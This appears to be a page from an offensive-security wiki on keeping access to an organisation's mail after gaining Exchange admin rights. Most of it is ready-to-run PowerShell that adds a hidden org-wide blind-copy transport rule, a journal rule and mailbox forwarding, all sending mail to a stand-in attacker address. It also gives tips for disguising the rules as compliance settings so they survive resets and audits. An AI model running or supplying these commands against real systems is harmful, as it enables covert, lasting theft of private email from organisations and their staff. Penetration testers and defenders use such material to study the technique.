---
title: "Mail flow persistence: transport rules, journaling, and forwarding"
order: 7
description: "Durable org-wide mail exfiltration from an Exchange-admin context: server-side transport rules that blind-copy all mail to an external address, journal rules that archive a mailbox or scope to an external target, and mailbox-level forwarding with Set-Mailbox and inbox rules, all surviving the victim's password reset."
keywords:
  - transport rule
  - journaling
  - BlindCopyTo
  - ForwardingSmtpAddress
  - mail flow persistence
---

# Mail flow persistence

Once you hold an Exchange-admin context (from an [RCE chain](rce-chains/index.md), a [relay](privexchange.md) that reached Exchange, or a compromised admin), mail flow itself becomes a persistence and exfiltration channel. A **transport rule** acts on every message the organization sends or receives, so one rule silently blind-copies all mail to an address you own. **Journaling** was built to archive mail for compliance, so a journal rule hands you a mailbox's or the org's entire message stream. At the mailbox level, **forwarding** (a `Set-Mailbox` property or an inbox rule) copies one target's mail outbound. None of these touch the victim's password, so they **survive a reset**, and they live in Exchange configuration rather than on any endpoint.

## Preconditions

- Exchange Management Shell access in an admin role (`Transport Rules`, `Journaling`, or `Mail Recipients`), which an Exchange admin or post-RCE `SYSTEM` context grants.
- For external delivery, outbound mail to your collection domain must be permitted (most orgs send outbound freely).

## Transport rule: blind-copy all org mail

A transport rule with a `BlindCopyTo` action silently adds your address as a Bcc on matching mail. Scope it to everything and it is org-wide interception:

```powershell
# Bcc every message to an external collector; no condition = all mail
New-TransportRule -Name "Standard Journaling" -BlindCopyTo "collector@attacker-domain.com"
# confirm it is live and unconditioned
Get-TransportRule "Standard Journaling" | Format-List Name,State,BlindCopyTo,Conditions
```

Interpret the confirmation: `State: Enabled` with an empty `Conditions` list means every inbound and outbound message is now Bcc'd to your address. Name it something that blends into existing compliance rules (`Standard Journaling`, `DLP Policy`) so it survives a casual look at the rule list. Recipients see nothing; Bcc is invisible in the delivered message.

## Journal rule: archive a mailbox or the org

Journaling delivers a full copy of messages (with an envelope report) to a **journaling mailbox**. Point that at an external contact and you receive the stream. First ensure outbound journal reports are allowed, then create the rule:

```powershell
# Set the journaling mailbox (NDRs for undeliverable journal reports) and add a rule
Set-TransportConfig -JournalingReportNdrTo "collector@attacker-domain.com"
New-JournalRule -Name "Retention" -Recipient "ceo@example.com" `
  -JournalEmailAddress "collector@attacker-domain.com" -Scope Global -Enabled $true
Get-JournalRule "Retention" | Format-List Name,Recipient,JournalEmailAddress,Scope,Enabled
```

`-Recipient` scopes the capture to one mailbox (omit it for the whole org); `-Scope Global` captures internal and external mail. The confirmation showing your `JournalEmailAddress` and `Enabled: True` means journal reports for the target now flow to your collector.

## Mailbox forwarding: one target, outbound

For a single high-value mailbox, set server-side forwarding directly, which does not depend on the victim's client:

```powershell
# Forward a mailbox's mail to an external address, keeping a copy so nothing looks missing
Set-Mailbox -Identity ceo@example.com -ForwardingSmtpAddress "collector@attacker-domain.com" `
  -DeliverToMailboxAndForward $true
# a stealthier, mailbox-local variant: an inbox rule that forwards and marks read
New-InboxRule -Mailbox ceo@example.com -Name "sync" `
  -ForwardTo "collector@attacker-domain.com" -MarkAsRead $true
Get-Mailbox ceo@example.com | Format-List ForwardingSmtpAddress,DeliverToMailboxAndForward
```

`DeliverToMailboxAndForward $true` keeps the user's copy so the mailbox looks normal while you receive every message. `Get-Mailbox` echoing your `ForwardingSmtpAddress` confirms it. The `New-InboxRule` variant stores the forward as a mailbox rule rather than a mailbox property, which is a different place to hide it.

## Follow-on

Any of these gives **durable, org-wide or targeted mail exfiltration** that outlives credential resets and endpoint cleanup, because it lives in Exchange configuration. It is also an intelligence feed: continuing access to executive and helpdesk mail yields fresh credentials, reset links, and internal context for further movement. Combine with [mailbox access](mailbox-access.md) for one-time bulk theft plus this for ongoing collection.

## Exploitation notes

- Choose scope deliberately: a transport rule or global journal rule is loud and total; mailbox forwarding on one executive is quiet and targeted. Match it to the engagement's stealth needs.
- Blend the names into existing compliance artifacts (`Journaling`, `Retention`, `DLP`) so the rule survives a glance at the configuration.
- Journaling emits an envelope report that is clearly a journal message, whereas `BlindCopyTo` delivers a plain copy; the Bcc rule looks less like an archive if someone inspects your collector.
- These survive password resets because they are configuration, not credentials; they are removed only by someone auditing transport rules, journal rules, and per-mailbox forwarding directly.

## Tools

- **Exchange Management Shell** (`New-TransportRule`, `New-JournalRule`, `Set-TransportConfig`, `Set-Mailbox`, `New-InboxRule`): all of the above from an admin context.
- **ruler** (SensePost): mailbox-level inbox-rule forwarding over MAPI/EWS when you hold only a mailbox credential.
- **EXO/EWS scripts**: scripted rule creation across many mailboxes.

## References

- [Microsoft: New-TransportRule](https://learn.microsoft.com/en-us/powershell/module/exchange/new-transportrule)
- [Microsoft: journaling in Exchange Server](https://learn.microsoft.com/en-us/exchange/policy-and-compliance/journaling/journaling)
- [MITRE ATT&CK: Email Collection, Email Forwarding Rule (T1114.003)](https://attack.mitre.org/techniques/T1114/003/)
